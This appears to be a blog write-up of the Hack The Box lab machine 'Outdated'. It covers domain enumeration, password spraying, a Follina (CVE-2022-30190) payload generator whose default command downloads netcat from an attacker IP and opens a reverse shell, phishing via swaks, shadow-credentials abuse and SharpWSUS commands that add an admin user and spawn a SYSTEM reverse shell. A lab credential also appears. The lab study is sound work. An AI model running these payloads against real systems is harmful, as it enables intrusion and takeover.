---
title: 'HTB-Outdated'
published: 2025-09-18
draft: false
toc: true
---
**Start 07:58 27-09-2025**

---
```
Scope:
10.10.11.175
```
# Recon
## Nmap

```bash
sudo nmap -sV -sC -sT -p- outdated.htb -T5 --min-rate=5000 -vvvv -Pn

PORT      STATE SERVICE       REASON  VERSION
25/tcp    open  smtp          syn-ack hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-09-27 14:00:55Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Issuer: commonName=outdated-DC-CA/domainComponent=outdated
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8530/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesnt have a title.
|_http-server-header: Microsoft-IIS/10.0
8531/tcp  open  unknown       syn-ack
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack Microsoft Windows RPC
49901/tcp open  msrpc         syn-ack Microsoft Windows RPC
58694/tcp open  msrpc         syn-ack Microsoft Windows RPC
58712/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

There's a web server open on `8530` and `smtp` seems to be open as well. Furthermore this seems to be a **Domain Controller** inside the **outdated.htb** domain called **DC.outdated.htb**.

I also noticed the `mail.outdated.htb` subdomain present as mentioned by `smtp`.

## 88/TCP - Kerberos
### Kerbrute

I started off by enumerating any and all usernames inside the domain using the `statistically-likely-usernames` repo:

![](attachments/92074e1481e2a7ccd7a97e2248c89bb1.png)

![](attachments/b6511b4fe4ea1c6f164d7f4de3ee2c96.png)

From this I went ahead and made a `users.txt` list for further password spraying.

```users
sflowers
Administrator
Guest
client
```

## 445/TCP - SMB
### netexec - password spray

By using this user list I went ahead and sprayed it against the DC:

![](attachments/ec5785a1f0eda1290d1828bd8e112381.png)

We got a valid match!

```
client
sflowers
```

### netexec - enum

I then went ahead and started enumerating what sort of access this user had:

![](attachments/fabc4fa103b9b33d76a19fe93d41441e.png)

Seems like we can't enumerate the shares but we do have access to `ldap`.

### Enum4Linux-ng

Since we have a valid set we can use it with `enum4linux-ng` to enumerate the DC:

![](attachments/8dbbc03054f443fa2def6c9bfacc2e32.png)

![](attachments/9293ea525b69c7f80711ecaf79c6400c.png)

Further down we find the network shares present:

![](attachments/1e5ba299a3aceb5dac4b405a371e764e.png)

Since this script told us that authentication with blank usernames and password is allowed we might just do that:

![](attachments/df90d5778c7f270c2b680ed192d93e99.png)

There's one file present inside the `Shares` share which we can read and access:

![](attachments/b48b93926e3b7e3364c1998379f50045.png)

Let's download the file and check it out.

![](attachments/98fc63abde1e9b88635b5a5cfcf2299c.png)

![](attachments/2eb9ef07006646b4b56773c4cfc490c1.png)

This looks really promising!

:::note
The print spooler service being on could result in an easy PrivEsc further on.
:::

We also get an email from this.

```
itsupport@outdated.htb
```


# Exploitation
## CVE-2022-30190

I started digging into this one:

![](attachments/89d5a840e00070b40a00d2b4fc155f77.png)

This led me to another [blog post](https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e)

![](attachments/2f2f8c51016bdbe6c5b4613d93d031a9.png)

So naturally I looked it up on `github`.

![](attachments/8ad8dca98ed0cde6eb1cd670da93cb12.png)

We can use the following [gihub repo for reference](https://github.com/JohnHammond/msdt-follina) by John Hammond:

![](attachments/398eca92b962fb35b83ce0bd0b3721a6.png)

Let's check out how to run this:

![](attachments/aedc4d8ce4cc08582a5c1d20d4e22135.png)

I moved the two files over to my directory and got to work:

![](attachments/eafb4db2510cf52e9d8b00c95b401895.png)

Since the `follina.py` script is quite extensive we can instead narrow it down just to the following:

```python
#!/usr/bin/env python3

import base64
import random
import string
import sys

if len(sys.argv) > 1:
    command = sys.argv[1]
else:
    command = "IWR http://10.10.14.7/nc64.exe -outfile C:\\programdata\\nc64.exe; C:\\programdata\\nc64.exe 10.10.14.7 443 -e cmd"

base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

# Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
html_payload += (
    "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
    + "\n</script>"
)

print(html_payload)
```

We save it and run it and save the output to an `.html` file:

![](attachments/35d24618ad4c2c3e91c41ee77ac3321d.png)

We can then set it up.

## Phishing for access

We need the following for the payload to fire:

```bash
# Swaks command
sudo swaks -t itsupport@outdated.htb --from tester@test.htb --server 10.10.11.175 --body "http://10.10.14.7/test_file.html" --header "Subject:Internal Web App" --suppress-data

# Python server
http 80

# Listener
rlwrap nc -lvnp 443
```

Upon running and waiting for a short while we get a response:

![](attachments/e1cf41011ef2a2212a6cbdc235313fd1.png)

# Foothold
## Shell as btables

Afterwards I created another reverse shell to `penelope` in order to get a more stable shell using `Powershell #3 (Base64)` from RevShells.

![](attachments/4fcb904f2ae3713ba4830799d9657814.png)

Right away I noticed that I landed inside either the internal network or a **HyperV** container, and not inside the actual external machine:

![](attachments/7cb6b65b411f9058f04074c4cf68dbfb.png)

Nevertheless I enumerated the user:

![](attachments/bb469a9e9f4bf828d90cd0bb561e9d8e.png)

We find a valid credentials set which we might be able to use later on:

```creds
btables@outdated.htb
GHKKb7GEHcccdCT8tQV2QwL3
```

## BloodHound

Time to do some enum.

![](attachments/771a280c1f8c3c55a46abf193f8fbd53.png)

It seems we are the only ones with *sflowers* on this domain as regular users, let's see if we can get an edge over them.

![](attachments/44e426cf9f7db8506c287807faa69812.png)

I then went ahead and transfered the `.zip` file over to `kali`.

![](attachments/accb5afad6b8e85bf01a130ac0b66902.png)

![](attachments/4de5053320ba394a55d0daba840dd505.png)

Let's get to graphing.

![](attachments/e6eec3c48feb11952897c02330b1a028.png)

![](attachments/f28f1d6871b707a0a6cf91a0226b7d57.png)

As expected, we can easily own *sflowers* in order to achieve full access over the domain.

## Shadow Credentials - AddKeyCredentialLink

As per [SpecterOps](https://bloodhound.specterops.io/resources/edges/add-key-credential-link):

:::quote
Writing to this property allows an attacker to create “Shadow Credentials” on the object and authenticate as the principal using kerberos PKINIT.
:::

We can abuse this permission using `pywhisker`:

![](attachments/254083f0329dd231ff3e5d1220b4ac88.png)

We can't use this one yet since we don't have valid creds.

:::note
For reference, I tried using the previously found credentials but they didn't work:

![](attachments/96db3e6b6ae5ad3a23d070262bec379b.png)
:::

This meant that instead I'd have to download over the **Windows** version:

![](attachments/50dbb39977fab2ace0f7eb856ddd185e.png)

Instead of building the `.exe` executable I downloaded over the `.ps1` module from [here](https://github.com/IAMinZoho/OFFSEC-PowerShell/tree/main):

![](attachments/28ff67f9af83a26a37766d9e298bfa1e.png)

We can run it as follows:

```powershell
Invoke-Whisker -command "add /target:sflowers"
```

Upon running we see this output:

![](attachments/a154c752addaa75131b5512793038149.png)

Let's upload `rubeus.exe`:

![](attachments/a4e94ce425c9cb3159248fbe4ed8ce2f.png)

I copy pasted the outputted command and let it run, and all the way at the bottom we see the `NTLM` hash:

![](attachments/78f689daa0211d6047b5d127a3a6a00f.png)

## Lateral Movement as sflowers

We can move to *sflowers* now:

![](attachments/f7343bed17228e0f917be59cb3c5eb00.png)

Now that we're in we should do some digging.

![](attachments/e1e37f81aaf8486a5f1dc27d45cfc430.png)

![](attachments/a091ee3b296b9fc26fd1a32af9716fcb.png)

It looks like the other network was indeed inside a **Hyper-V** instance.

### user.txt

![](attachments/6948beb39645b58818e96b8e86e3af91.png)

# Privilege Escalation
## SharpWSUS

Checking back inside `BloodHound` we notice that we're part of the **WSUS Administrators** group:

![](attachments/ca70acd3cdeafbc417e1154df93524fa.png)

![](attachments/6d525e220e1e92e38b7e219ec38f6e6f.png)

We can exploit this group membership by using `SharpWSUS`:

![](attachments/d7ab4aaaad32f172850d6cd05da918da.png)

Namely we can exploit it using the following command to create a `psexec` instance:

![](attachments/594b249a51897aa3e1638b06e4c2e1d4.png)

```powershell
SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"
```

I will yet again use [this script](https://github.com/IAMinZoho/OFFSEC-PowerShell/blob/main/Invoke-SharpWSUS.ps1) instead of building the `.exe` version.

![](attachments/4bf1dd03df95a3364c87c271bff0dbe6.png)

We can test if it works:

![](attachments/f7113e9ea2e57f13d929d37e910ec840.png)

Next up we need to download over the `psexec.exe` binary:

![](attachments/8892cebc209b11253b80fcc212a1aed5.png)

I download the zip and transfer the binary I need:

![](attachments/39e918d5ed8a118b564a114798f50911.png)

![](attachments/ab32b9f88e48b23e3c4ed0466b5bb1f7.png)

Let's chain it together.

```powershell
Invoke-SharpWSUS create /payload:'C:\Users\sflowers\psexec.exe' /args:'-accepteula' -s -d cmd.exe /c \'net user tester Password123! /add && net localgroup Administrators tester /add\' /title:'Testing'
```

![](attachments/ee8276aa49b87d28381d8b84561791ed.png)

```powershell
Invoke-SharpWSUS approve /updateid:2c42b515-101b-4c18-ab80-be3688d57798 /computername:dc.outdated.htb /groupname:"Test"
```

![](attachments/08ec19786976004b72934924cc3ba6df.png)

```powershell
Invoke-SharpWSUS check /updateid:3c71320a-edbe-431f-9c71-e82515ceb8b4 /computername:dc.outdated.htb
```

![](attachments/0f9b3d9daf46c13527644e831ea10f3b.png)

:::fail
This ended up soft failing and did not create a user, so instead I opted for a reverse shell.

:::

I instead uploaded `nc.exe` and created a reverse shell that way:

```powershell
Invoke-SharpWSUS create /payload:"C:\Users\sflowers\psexec.exe" /args:"-accepteula -s -d c:\Users\sflowers\nc.exe -e cmd.exe 10.10.14.7 443" /title:"Test5"
```

![](attachments/dd9aa8fcb17778778e00fc01e7afc6f4.png)

Afterwards we use the `approve` command:

```powershell
Invoke-SharpWSUS approve /updateid:d68ae9a7-913a-415e-881f-e6d3a7272d58 /computername:dc.outdated.htb /groupname:"Test5"
```

![](attachments/be9aaaa13a7eef662cdd61c0a485cc19.png)

The result is a *SYSTEM* shell:

![](attachments/4855df5d84d721eb49f47325b8f66663.png)

:::warning
The above commands may fail or just not execute, keep trying and it will work eventually.
:::

### root.txt

![](attachments/ab8325eeba18fd5f3df3da0c1cf77dd7.png)

![](attachments/a90761e0d116008b1dca0ccebd2f6dd7.png)

---

**Finished 12:30 27-09-2025**

[^Links]: [[Hack The Box]]

#kerbrute #netexec #enum4linux #CVE-2022-30190 #phishing #swaks #AddKeyCredentialLink #ShadowCredentialsAttack #SharpWSUS #BloodHound 
